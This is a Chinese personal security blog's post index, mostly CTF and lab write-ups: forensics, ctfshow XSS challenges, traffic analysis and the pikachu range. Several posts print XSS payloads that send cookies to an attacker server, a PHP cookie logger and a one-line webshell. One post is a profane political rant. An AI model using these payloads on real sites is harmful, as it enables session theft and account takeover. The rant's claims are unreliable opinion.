现已获取某个APP程序，请您对以下问题进行分析解答。\n  本程序包名是？（答案参考格式：abc.xx.de）\n  附件下载 提取码（GAME）备用下载\n\n打开我们的雷电工具，显而易见\n\n程序分析_2\n  本程序的入口是？（答案参考格式：abc.xx.de）\n\n继续看\n\n得到minmtta.hemjcbm.ahibyws.MainActivity\n程序分析_3\n  本程序的服务器地址的密文是？（答案参考格式：abcABC123）\n\n反编译一下，拿到源码\n\naHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6\n程序分析_4\n  本程序实现安全检测的类的名称是？（答案参考格式：abcABC123）\n\n继续顺一下我们的源码，安全检测，发现了相关源码\n\n网站取证网站取证_1\n  据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。\n  请从网站源码中找出木马文件，并提交木马连接的密码。（答案参考格式：abcABC123）\n  附件下载 提取码（GAME）备用下载\n\n下载附件，看一下，全是源码，咱们vsc打开翻一翻\n然后挨着翻也就翻到了一句话木马\n&lt;?php assert(@$_POST[&#39;lanmaobei666&#39;]); ?&gt;\n\n网站取证_2\n  请提交数据库连接的明文密码。（答案参考格式：abcABC123）\n\n\npasswd指到了my_encrypt()\n\n根据源码得到解码脚本\n&lt;?phpfunction my_encrypt()&#123;    $str = &#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;;    $str = str_replace(array(&quot;/r/n&quot;, &quot;/r&quot;, &quot;/n&quot;), &quot;&quot;, $str);    $key = &#x27;PanGuShi&#x27;;    $iv = substr(sha1($key),0,16);    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&quot;&quot;,MCRYPT_MODE_CBC,&quot;&quot;);    mcrypt_generic_init($td, &quot;PanGuShi&quot;, $iv);    $decode = base64_decode($str);    $dencrypted = mdecrypt_generic($td, $decode);    mcrypt_generic_deinit($td);    mcrypt_module_close($td);    $dencrypted = trim($dencrypted);    return $dencrypted;&#125;echo my_encrypt();?&gt;\n\n结果KBLT123\n网站取证_3\n  请提交数据库金额加密混淆使用的盐值。（答案参考格式：abcABC123）\n\n还是翻源码，得到\n\nfunction decrypt($data, $key = &#39;jyzg123456&#39;)\n","tags":["wp","SkyMirror","Forensics"]},{"title":"ctfshow_xss_wp","url":"/2022/05/14/ctfshow_xss_wp/","content":"跨站脚本攻击在这一套题目中体现的淋漓尽致。\nweb316跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，\n都差不多，比如http://xsscom.com/加载的还比较快。\n我用的自己服务器，贴上一个这个脚本\n&lt;?php$cookie = $_GET[&#x27;1&#x27;];$log = fopen(&quot;flag.txt&quot;, &quot;a&quot;);fwrite($log, $cookie . &quot;\\n&quot;);fclose($log);?&gt;\n\n我这里建议文件名不要用xss，因为我刚开始用的xss，后边会有题目把xss过滤了。\npayload：\n&lt;script&gt;window.location.href=&#39;http://自己服务器IP/a.php?1=&#39;+document.cookie&lt;/script&gt;\nwindow.location.href可以理解成是，跳转到href里，具体参考https://www.cnblogs.com/Qian123/p/5345298.html#_label3\ndocument.cookie就是创建一个cookie,这里是把目标cookie窃取下来，具体参考https://www.runoob.com/jsref/prop-doc-cookie.html\nweb317-319这里属于是一招鲜吃遍天了，这里过滤的东西都不一样，有img，script，xss\n但是payload:\n&lt;body onload=&quot;document.location.href=&#39;http://IP/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;\n无敌\nweb320-web326过滤了空格，但是tab或者/或者/**/都可以用\n所以payload:\n&lt;body/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;\nweb327开始来到存储型XSS，难度起来了。\n这题注意收件人要是admin\n然后信的内容还是老样子\n&lt;body/**/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;\nweb328这题打开会发现貌似没有传xss payload的地方，但是细心的同学会发现\n\n也就是说，如果我们是admin，说不定就拿到flag了，那咱们有了admin的cookie，是不是就能伪装成admin呢\n那么还是怎么传payload的问题，密码为啥不能是payload，注册就拿到cookie了\n这题body不能用了，返璞归真，用script\n&lt;script&gt;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie;&lt;/script&gt;\n\n如果你很不幸x到了自己，出了多个sessionid，那么就选最后一个\n然后抓包，改个cookie就OK\n\nweb329在这个例子中，admin的sessionid每次会话都会变，所以没办法使用sessionid进行登录（机器人好像设置的是上去一下就下来），那么思路就是让注入的XSS Payload自动读取本页面的带有ctfshow的字段并发到vps上。 注册一个普通账号并登录，修改一个显示密码的地方为ctfshow&#123;123456&#125;，然后尝试直接在console中将这段字段读出来并发送到vps中，使用jQuery的类选择器：\n\n群主就根据这个东西写出来了payloa\n&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;window.location.href=&#39;http://ip/a.php?1=&#39;+value.innerHTML;&#125;&#125;);&lt;/script&gt;\n还是拿这个当作密码，就可以了。\nweb330上来先试一梭子上一题的payload，好像并没有成功。\n继续看这题多了个修改密码界面，那么只要让管理员修改成我们知道的密码，就能解决了\nx到管理员，还是得走我们的密码。先抓个包看看改密码的api\n\n\n&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=123&#39;;&lt;/script&gt;\n这里的由于x的是admin，所以用了admin的本地IP127.0.0.1\n注册，发现并没有什么用，试试用户名，你看那用户名，很长一筐，其实之前一直没用用户名，是因为用户名只能注册一次，但是密码可以重复\n或者保险起见，直接用户名密码全是xss\n好了，admin#123 登陆成功，为了防止自动跳转，这里抓一下\n\n\nweb331上来，先试一试上一题的payload，好吧，并没有那么幸运\n这里注意到url，发现并不是get了，那么猜测是post，抓包一看，果然是\n\n仿照，post的源码，写个payload就好了\n\n\n&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;\npayload来喽，解决\n\nweb332先试一下上一题的payload，就是说，只要拿到admin了，什么都好说，然后失败了，转换思路。\n这题很简单，要买flag嘛，但是钱不够，还有个转账口子\n尝试转负的，然后就成功了\n\n购买flag，成功\n这题也可以给自己转账，然后会发现，给自己转账是不要钱的，然后就可以一直转，只要金额少于自己的余额就行。\n这里就不再演示了。\n然后这好像跟xss没什么关系，现在x不到admin的密码了，我们试一试能不能直接x一下admin转账，我们抓包看一下转账的传参\n\n改一下上一题的payload\n&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;\n搞定啊\nweb333首先试一试上一题，给自己转账是可行的，x到admin转账也是可行的。\n\n&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;\n总结js很重要，可以通过js搞整个网页\n","tags":["Web","XSS","wp","ctfshow"]},{"title":"闲聊——第一次HW","url":"/2022/08/10/hw01/","content":"我很幸运，参加了2022的国家hw行动，7.24-8.8 历时十五天，结交了一些圈内大佬\n说实话，hw很难学到一些技术性知识，就算有，也是摸鱼时闲着没事自学的，还有就是一些安全设备使用，幸运的话，可以学一些研判甚至是溯源相关的知识。\nhw最主要就是结实一些圈内大佬，去大城市看看，与各个厂商大佬交流，见见世面，当然可以捞一波💴，但是一定要小心，不要被黑心中介骗了。\n这次hw，说的最多的一句话是：“这🐕上海，🐕都不来，真不是人活的”\n外地人在上海是真的难活，特别是一般的打工人，这边的物价是真要命，而且一辈子也买不起上海的一套房。\n一个月房租就要2k+，每顿饭也得20+，一块油饼就要八九块，一碗豆花也要八九块\n不过我在这边活得还是比较滋润的，因为是包差旅嘛，我就需要吃个饭花钱，而且公司还给提供吃不完的零食饮料，前几天一天还点两顿外卖，因为我是夜班嘛，就下班吃一顿，上班前吃一顿。到了后边公司零食越来越丰盛，每天就吃一顿。一般是半夜吃，然后早上吃个泡面或者小面包啥的。\n可以晒一下我吃的东西\n这是吃的一些泡面，自热米饭之类的\n\n\n\n\n\n\n\n\n这一份在我们门口摆放了好久，也没人吃，好像是甲方那边的，也只有我一个人吃过，感觉还不错\n\n\n后边是一些日常的零食，饮料，以及人生第一瓶百岁山\n\n\n\n\n\n\n在这边的工作是比较轻松的，每天刷刷微步，吃吃零食，做做巡检，看看告警\n在微步上我们被称作YT，鼠标猴\n\n十五天很快，一会就过去了，这里引用微步的一段话\n\n明天之后，你我各归岗位。太阳照常升起，小王背着双肩包挤地铁，小李又在客户现场逢着一位心仪的姑娘。人来车往，岁月静好，一切如常。海水冲刷沙滩，这十五天的一切，仿佛从来没发生过。但是某个时刻，也许你我会记起，我们曾共同在中国网络空间留下一页红蓝色的篇章，刻下攻与防的痕迹。战斗是为了永久的和平。无论如何，世界已经因为这场不见硝烟的演习而永久性改变。功成不必在我，功成必定有我。其中故事，我们来日再续。\n\n\n这十五天，也有两个人，让我感到非常愧疚。\n一位是7.30那天晚上冒雨为我送外卖的骑手，他因为送我的单，淋坏了自己的手机。那天晚上雨很大，我却无能为力。\n还有一位就是她，和我异地了一年多的她，从高中同学变成情侣又变回了高中同学\n7.27是她的生日，我在hw，8.4是七夕，我还在hw，8.5我们成为了高中同学\n","tags":["HW","chat"]},{"title":"(陇剑杯 2021)ios系列","url":"/2022/04/29/ios_flow/","content":"（1）根据经验，没思路就追踪TCP流\n追到15流，会发现一坨东西，翻一翻就能得到。\n\n很明显，3.128.156.159\n（2）还是刚刚追踪的TCP流\n\n项目连接都摆出来了\n\nhttps://github.com/ph4ntonn/Stowaway/\n\n工具就是stowaway\n（3）访问项目连接，翻一翻得到了\n\nhack4sec就是密文了\n（4）翻来覆去，并没有找到跟SQL注入有关的数据，但是看见了TLS加密的\n解密（wireshark➡编辑➡首选项➡protocols）一下，看HTTP2发现了SQL注入的语句，存下来，然后把需要的数据筛选出来，这里我看花眼了，所以写了个脚本\nimport refile = open(&quot;1.txt&quot;,&#x27;r&#x27;)indata = file.read()obj = re.compile(r&quot;_from_user%29%3D%22(?P&lt;wahaha&gt;.*?)%22_then_id_else&quot;,re.S)result = obj.finditer(indata)for it in result :    print(it.group(&quot;wahaha&quot;))\n\n然后得到的数据，hex解码一下，就能得到\n\n746558f-c841-456b-85d7-d6c0f2edabb2\n\n（5）两种办法，第一种很笨，就是用wireshark过滤，借助\n\ntcp.port == n\n\n发现10-499是有数据的\n\n\n第二种参考了雪殇的wp，TCP dump一下\n\ntcpdump -n -r triffic.pcap | awk ‘{print $3}’ | sort -u &gt; ou1t.txt\n\n\n（7）看一眼access.log,很明显\n\n再结合（4）或者（5）都能得到192.168.1.12\n（8）看日志，明显。\n\nwebshell特征，所以密码为fxxk\n","tags":["wp","flow","Misc"]},{"title":"Misc_流量分析_基础","url":"/2022/06/17/misc_flow/","content":"不能鸽了，从考试周，鸽到现在，新建文件夹半个月了，今天必写出来\n开始咱们先说点流量分析常见的题目。\nflag能直接找到这部分题可能就难在谁有耐心吧，最简单的就是通过flag查找工具，直接找到flag，或者是通过常见编码后的flag\n常见的有这几种\n\n#默认字符关键字flag,666c6167,Zmxh,&amp;#102,464C4147\n#默认正则关键字flag{.+},666c6167\\w+,Zmxh[\\w=]+,&amp;#102.+\n#其他关键字key,ctf,f1ag,ffllaagg,f-l-a-g\n#flag二进制格式1100110011011000110000101100111\n#正则编码类key{.},ctf{.},f1ag{.*}\n#正则匹配中文[\\u4E00-\\u9FA5]+\n#百里挑一正则.[a-f1234567890]{17}}\n#ip正则\\d+.\\d+.\\d+.\\d+\n#flag反写{.*}galf\n#安恒dasctf\ncyberpeace{.*} \n\n还有一些流量包东西很杂，一条条翻太慢了，可以在跑一下string，就一目了然\n还有一些就是flag分段的，可能每个字母都在不同的包中，也可能分成了几段。\n这一块中，比较难的就是编码不常见的，那玩意看见了都不一定能猜到那是flag，更何况他再藏得深一点，像第二届网刃杯的\nncsubj、xyp07和cryptolalia\n这个xyp07很奇妙，拿科莱一跑就出来了。\ncryptolalia非对称加密，这个看出来需要一定的经验。\n能从流量包中提取出文件的这一块大部分都能通过导出文件这一操作来实现，当然有些时候用binwalk或者是formost分离出来，如果这个文件是在流量包中的，那么这两个工具提取可能没有那么顺利，比如说一个图片可能能提出来，但是损坏了，这样很影响后边的判断。但是如果是流量文件隐写了个文件，这俩工具还是挺好用的。\n导出文件操作呢，不熟悉wireshark的可能不会\n具体就是\n左上角文件—&gt;导出对象\n\n还有一种是流量包中存在被base64编码过的文件\n经典的菜刀666，之前也有写过，在这里\nSQL盲注流量这一块在日志分析，流量分析中都会涉及，考到了也不难，就是那一种题型\n之前也在这里写过\n之前没有提供脚本，这边给大家一个，但是需要根据具体题目自己改一改\n#GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2038,%201))&gt;125import rea = []with open (&quot;sqltest.pcapng&quot;,&quot;rb&quot;) as f:#读取pcap文件    for i in f.readlines():        if (b&quot;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),&quot; in i):            #print(i)            a.append(i)#把这些东西搞到a数组里a1 = &#123;&#125;for i in a:    #print(i)    b = re.search(br&quot;%200,1\\)\\),%20(\\d+),%201\\)\\)&quot;,i).group(1)    c = re.search(br&quot;&gt;(\\d+) HTTP/1.1&quot;,i).group(1)    #print(b)    #print(c)    a1[int(b)] = int(c)#从a开始调出来#print(a1)flag =&#x27;&#x27;for i in range (1,39):    flag+=(chr(a1[i]))print(flag)#整成一行\n\nUSB流量分析这一块常考的就是键鼠，都考烂了，应该不会难，2022国赛换汤不换出了一个，也是给我整懵逼了，这里边分了两块，一部分是能跑出个压缩包，另一部分是密码，刚开始没意识到，跑出来rar损坏，然后把队友思路都整偏了，都在修rar，我的错我的错。\n比较难的，见过一个数位板这里写过\n还可能会出现一些手柄，刻字机啥的。\n然后推荐雪殇以及其他两位大佬共同写的一个工具，只能说tql\n工具在这里\n根据题目要求做题这部分一定要认真读题，可能并不是找flag，一定要看清楚让你找啥，比如说一些工控题目，webshell比如这个\n这部分里也有你从未接触过的知识，这样可以仔细看一下追踪流，找找有什么规律，比如2021国赛题目robot，之前也是写过\n还有就是第二届网刃杯：喜欢移动的黑客、LED_BOOM\n一定一定要认真读题，认真分析，认真找规律。\n总结流量分析大体思路\n\n\n拿到后，先看一下题目题干，然后先find\n如果没有找到，看一下是不是http，若果是先统计http请求看一下，或者是放到科莱里，总体看一下\n导出对象，看一下\n追踪流，挨个流看，如果很多，倒着看\nstring跑一下\n是不是usb，跑脚本\n有没有隐写\n有没有大串编码\n从来没见过的协议，去百度\n记得把文件放010editor里看一下\n\n\n这部分还算是比较简单，算是基础吧，像那些WiFi，被加密过的流量，都还没有写，因为那些我也玩的不遛\n","tags":["flow","Misc","study"]},{"title":"闲聊——纪念守望先锋国区停服","url":"/2023/01/24/ow/","content":"在一切的开始, 作为一名普通中国的守望先锋玩家, 对于我来说, 这无疑是一场悲剧, 我想首先声明一下, 在这场悲剧里, 我不站边, 我选择中立, 希望大家不要给我扣帽子\n守望先锋在1.23-1.24日 我和wanan以及Scofield, 一直陪伴守望先锋走完了最后的路, 最后几局基本就都是和平局了, 所有玩家意外的温柔, 也没有喷子, 大家凑一堆, 互相看看, 聊聊天拍拍照, 我也很荣幸是其中一员. 虽然当时守望先锋并没有强制下线, 但是大家也没有玩的心思了\n\n\n就这样过了二十几分钟, 天下没有不散的宴席, 我还是退出了游戏\n\n暴雪关于暴雪, 在国内是比较统一的风向, 大家都喷暴雪, 觉得是暴雪的霸王条款逼走了网易, 当然也不是没有可能, 并且小粉红们最爱的最信任的观察者网也是发表了这一系列言论\n\n对于这些言论, 熟悉观察者网尿性的人, 当然有自己的判断能力, 观察者网最喜欢贩卖中国人的爱国情怀, 通俗点就是说, 观察者网一直在传播中国人做什么都是对的, 但凡大脑发育正常的,  就能判断出这是无疑是一种错误的观点, 毕竟我们伟大的领袖🐱都承认自己的错误(文革)\n然后我就开始在百度和B站尝试收集比较客观的信息\n然后总结一下, 客观的信息还是很少, 基本一边倒的说暴雪是什么绿茶啊之类的, 当然也有有脑子的人提出了这个网易的实力不大行. 这里为什么说一边倒的信息就不客观呢, md我真不想解释这一点,  你们可以自行观看老梁的这个视频, 一边倒的信息都相信的人, 我可以大致分为这么几类, 一是脑残粉, 二是大脑发育不健全. 当然我一般喜欢把这两类类当作包含关系\n然后百度呢, 我推荐大家看一下这个新闻有脑子的人就知道, 这tm才叫新闻, 谁tm发个新闻不去摆事实, 而是一味的偏向一方说. 然而大部分人出来发文章发视频啥的, 理论依据都是来自网易发文, 是看不懂暴雪发文吗, 还是说根本没有人帮你搬运到墙内, 还有一些人老是去过度解读, 美言之小编认为\n\n这里提到了一个裁员问题, 由于我们伟大的🐻坚持三年变态清零(不知道他为啥非要坚持, 可能是自己还不如个0吧), 导致我们各大公司无奈裁员, 你裁员可以, 你tm把暴雪那边的人也裁了, 这tm出了事咋办. 暴雪提出异议是正常的, 但是无奈啊, 不裁员也发不起工资. 所以说, 当暴雪提出, 还没找到下家, 不希望让玩家损失, 想再合作六个月, 但是网易不同意啊, 这时候那些无脑狼狗又跳出来了, 喊什么网易做的好, 他们求着复合咱不同意, 太争气了, 你tm玩个游戏都要当吴京, 这得是什么无脑儿. 然而网易为啥不复合, 是跟你们这些人一样无脑为了不蒸馒头争口气吗? 如果他也无脑就不会成为大厂了, 大概率原因是, 裁员没人了, 过年期间人更少, 那些暴雪员工都撵回家了, 你让我把他们请回来, 怎么可能.\n有很多人就把网易和暴雪比作情侣或者是夫妻嘛, 我个人也认为这个比喻很恰当. 那么玩家呢就可以说是孩子. 夫妻俩闹离婚损失最大的就是我们孩子, 这时候就会面临一个问题你到底跟谁, 但凡这个孩子是正常点的就会想到, 跟谁都够呛有好日子, 后爹后妈都不可能对你好. 但是偏有一些无脑儿就非得去跟他爹, 他爹说什么就是什么, 并且还骂他妈是婊子,是绿茶. 有一天, 他妈放心不下孩子, 跟他爹说咱们要不再坚持几年, 等这孩子长大成人了咱再离婚, 他爹不同意, 他爹早就把床都卖了, 你这回来住哪. 然后孩子呢还说, 我爹做的太对了, 不愧是我们王氏家族的, 太nb了, 就不能管着那绿茶. \n\n\n那么为什么会有这种孩子呢?大家都知道孩子天生是一张白纸.子不教, 父之过. 原来啊他奶是老封建从小就不让他跟外边的小孩玩, 因为他奶在村里是臭名昭著, 怕孙子知道了, 不喜欢奶奶了, 他爹呢又不敢反抗他奶, 因为他爹住的房子都是奶奶的, 他奶奶把院墙(gfw)修的很高, 门也是经常锁着, 一般不跟任何人来往, 他爹好不容易找了个外地傻媳妇, 又因为种种不合离婚了, 他爹是啃老族, 还是被迫的,因为奶奶不敢让他出去, 怕管不住他. 妈妈也不用出去工作. 爸妈离婚后, 孩子也就断绝了跟妈妈的交往, 所以爸爸说啥就是啥.\n\n那么这个孩子还能不能像正常孩子一样呢, 他只能通过后天自己的努力, 好好学习, 甚至是翻院墙出去学习, 跟别的孩子多交流交流, 多了解别人说什么, 而不是奶奶说什么.\nreaction 一首rap你们的白嫖手段是从哪个网站窃取的段子#白嫖: real?显得傲慢又婊气的暴雪说着无聊的暗示#暴雪说什么了?不是网友一直在瞎猜?我们也不care玩你的游戏劝你回家反思#你不是玩家, 你怎么代表&#x27;我们&#x27;不尊重我们却忘记了是中国玩家给你饭吃#暴雪面向全球的公司, 靠中国玩家吃饭???你要抱着求复合了你们显得真廉价#求你了吗?我们身正不怕影子斜所以没人说闲话#说你闲话的你不看, 就装作没有是吧你暗里明里只会耍些见不得人的障眼法#你是暴雪高管吗?还是说你参加谈判了?你怎么什么都知道哇兄弟 你真是好大一朵白莲花#开始阴阳嘴臭把你们那渣男 都鲨烷我可不嫌这点麻烦就算没有你我们依旧继续发展终止这场合作不得不说你们真的大胆明年的今天就是你的忌日我去给你们送盆花篮#网易和暴雪真不一定哪一个先死耍一点破手段所以下不来台你那恶臭的样子早已名声在外#同样送给ccp猪厂才不会和你同流合污和你说声拜拜#继续嘴臭当然在准备拉黑你们之前送你一首 爱情买卖玻璃渣渣总爱玩过家家听你们的胡言乱语像在叽叽喳喳可现在留你们的时间只剩滴滴答答别总当小丑没空陪你们嘻嘻哈哈玻璃渣渣总爱玩过家家听你们的胡言乱语像在叽叽喳喳可现在留你们的时间只剩滴滴答答别总当小丑没空陪你们嘻嘻哈哈」\n\n整首歌的歌词刨析就这样, 我也懒得去输他的什么押韵, 在我看来也没有什么punchline, 旋律也是比较平, 延续了他一直的说唱风格, 虽然听感不错, 但是他的歌基本都这样, 也是我曾经比较认可他的原因. \n我最初喜欢rap是因为Tom MacDonald, 他会代表弱势发声, 他会敢于唱出不同的声音, 而不是像大部分国内地上rap, 真正上升到一定高度就没法播放了. 我喜欢rap的real/freedom/做自己/有话直说. 葫芦这首歌倒是做到了有话直说, 直接嘴臭骂人, 但是没有做到real, 在我看来就是随大流, 从歌词内容也能看出来, 毫无依据, 单纯随大流. 就像我不喜欢GAI一样, 你tm一个毒都吸的人, 还好意思出来装nm的正面人物, 以为超社会下架, 吸毒不贩毒的博文删除就能装作好人了, 就不说唱的什么山歌不符合我口味, md还说什么江湖气息, 那tm所谓的江湖, 什么梁山好汉, 不就是tm现在的痞子, 扫黑除恶早tm给你打了. 还有人说什么中国风, 贩卖爱国情怀, 纯有病, 你tm中国人就是一帮痞子???都tm丢我脸, 让全球都知道你tm会武术,爱打人?\n我向来是把做歌和做人分开看待的, 就像我认为人权和人命是分开的, 我会认为人权都没有了, 做人有什么用 like不自由毋宁死, like歌手歌好听就行了\n但是我为什么会听pgone, 讨厌GAI呢, 因为GAI去贩卖什么中国风爱国情怀，喜欢伪装自己，我不喜欢一个人特别装，表里不一，我认为这是违背黑怕精神的，他就不是一个合格的rapper，就像无脸男葫芦, 随大流, 没有自己的思考, 没有自己的考证.\n中国电竞听说暴雪已经禁止中国参加炉石赛事了\n\n关于原因, 我没有在网上找到相关言论, 我个人认为最大原因就是gfw你tm中国把人家墙了, 人家得费多大劲, 不如直接不让你们参加来的方便, 而且中国玩家, 外挂是真的多, 游戏素质真的低. 给赛事加大压力. \n还把人家骂上热搜, 你怎么不敢去骂ccp, 骂gfw\n不会有人和我高中某同学一样, 以为每个国家都有防火墙吧. 然鹅现实是, 大部分游戏分为中国服和世界服, 然后也只有中国和其他极少部分国家无法正常访问Google, 现在好像只有中国没法玩暴雪吧😂, 然后有人就跳出来说, 我们的香港和台湾不是可以访问吗? 现在你就需要想一想, 港台和中国的关系了\n有人批判暴雪把游戏上升到了政治, tmd是谁先把游戏上升到zz的? 好像不是暴雪吧, 你个防护墙为啥要墙游戏, 或者说你为啥要有防火墙? 难道不是zz目的? 防火墙的存在本来就是zz目的, 还在这贼喊捉贼, 这里也希望小粉红们有点脑子, 多想想根本, 别tm跟着观察者网玩了.\n而且, 你nb你也让你的网易上升到政治啊, 看看有没有人理你就完了. 这里可以以史为鉴, google退出中国, 无疑是中国的损失, 但是你tm百度退出美国, 对美国有个毛影响, 千万别以为China真的有你想象中那么nb, 盲目自大.\n中国电竞在家长和gfw的双重影响下, 很难有未来了. 可以发现现在比较火的游戏, 竞技性比较强的, 现在玩的人比较多的游戏无非就是LOL/王者荣耀(抄袭LOL)/和平精英(抄袭pubg)/CS, 还有个什么原神不也是抄袭塞尔达传说 旷野之息吗?\n这也就是为什么我们所说暴雪傲慢的原因, 你tm中国没有什么真正的国产创作, 全都中国抄袭啊, 人暴雪狂有狂的道理啊, 而且人家是世界公司, 你中国人再多, 对人家影响还能多大啊.\n别老是骂人家, 人家也懒得理你, 别老是发出中国最后的警告, 不如自己强大一些, 老在这狗叫干啥呢, 真有出息, 别tm抄袭, 自己创作一款没有任何争议的, 受大家喜欢的真正的中国游戏.\n或者说你真nb去推翻gfw, 推翻某党, 或者打到美利坚, 推特都发不了的人, 别整天在微博里woof.\n\n未来人终究还是要往前看的, 不能老是盯着过去不放\n在我刚知道网易和暴雪解约的时候, 我就在期待腾讯能来接. 但是一直没有听到这个消息, 最后还是停服了, 而且不知道下次开服是什么时候\n唯一的好消息是有传言pdd要和暴雪合作, 但是也只是传言而已, 真实性还是没法保证\n但是这一切都没法从根本解决问题, 怎么除根我上边已经提到过, 我也不想在结尾强调, 所以我把它放到上边了, 免得有人只看结尾, 不看内容就给我扣屎盆子, 毕竟Chinese是很’注重结尾’的\n","tags":["chat"]},{"title":"pikachu靶场","url":"/2022/08/28/pikachu%E9%9D%B6%E5%9C%BA/","content":"靶场安装我这里直接本地PHP_study安装了\n\n这里没什么好说的，第一步就是去配置文件里改一下数据库相关配置\n然后点击安装/初始化\n暴力破解\nBurte Force（暴力破解）概述\n“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。\n理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：\n1.是否要求用户设置复杂的密码；2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；4.是否采用了双因素认证；…等等。千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!\n你可以通过“BurteForce”对应的测试栏目，来进一步的了解该漏洞。\n从来没有哪个时代的黑客像今天一样热衷于猜解密码 —奥斯特洛夫斯基\n\n基于表单的暴力破解我们抓包,发到intruder,这里我们选择集束炸弹,加进去俩字典,筛选一下长度,然后就发现登陆成功\n验证码绕过(on server)这里我们抓包会发现,验证码是cookie验证,也就是说可以伪造,甚至是同一个验证码可以一直使用,我们就从一个验证码入手爆破\n验证码绕过(on client)先随便填一下看看，发现是js弹窗阻止了你前进的脚步，怎么办呢？\n浏览器有js，bp可没有啊，直接爆破\ntoken防爆破?经过不断的重发后我们会发现这个token是每请求一次就会随之改变，那么有没有方式捕获到呢\n这个题我们要灵活使用bp进行爆破\n我们发到intruder之后，攻击方式选择pitchfork，然后要进入到选项里\n\ngrep - extract 勾选，always勾选\n然后添加，这里我比较喜欢用正则，因为只要选中就会自动生成\n\n资源池里一定要有一个单线程的\n给密码payload选好字典后，将token的payload改为递归，并且手动输入刚才请求到的第一个token\n\nXSS\nXSS（跨站脚本）概述\nCross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：  1.反射性XSS;  2.存储型XSS;  3.DOM型XSS;\nXSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理: 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入; 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;\n你可以通过“Cross-Site Scripting”对应的测试栏目，来进一步的了解该漏洞。\n\n反射型xss(get)\n长度被限制了，看一下源码\n原来20，直接加个0,似乎是没有任何过滤,直接弹就行.\n\n反射型xss(post)这题给了我们一个登录账号密码admin\\123456,登录进去以后是一个框,这里好像还是没有任何过滤,但是我们用admin账号登陆了,就可以尝试一下xss拿admin的cookie,这里介绍除了官方平台给的另外两种方法,第一种很简单,用一下多彩互联网上的xss平台,不用自己搭建甚至是不用自己写一些js语句,就会自动钓信息 http://xsscom.com/ 这个平平台很简单,xss语句都给你写好了\n 另一种就是在自己的云服务器上写一些php代码就可以详情可以参考这篇https://charmersix.icu/2022/05/14/ctfshow_xss_wp/\n存储型xss存储型和反射型的区别这里不再赘述，但是payload还是一样的\nDOM型xss打一下我们的经典payload测试一看,过滤写到前端了,太好了,将注释闭合一下就可以了.\n经测试’可以打断我们””的闭合,所以payload&#39;1&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;\nDOM型xss-x\n上一题的payload还是可以用的，只是我们要再点一下就让往事都随风,都随风吧\nxss之盲打没有任何回显,源码里也看不见任何东西,我们dirsearch扫一下看看\n拿到一个目录,众所周知pikachu的账号密码是admin/123456当然你也可以装作不知道,再去爆破一下登录后台\n一登录后台我们就可以看到自己在留言板打的xss已经执行了,payload还是原来的经典,这时候就可以钓到admin的cookie了\nxss之过滤打上我们那串经典的payload,很明显没有执行,那就换一套连招\n\n&lt;img src=&#39;x&#39; 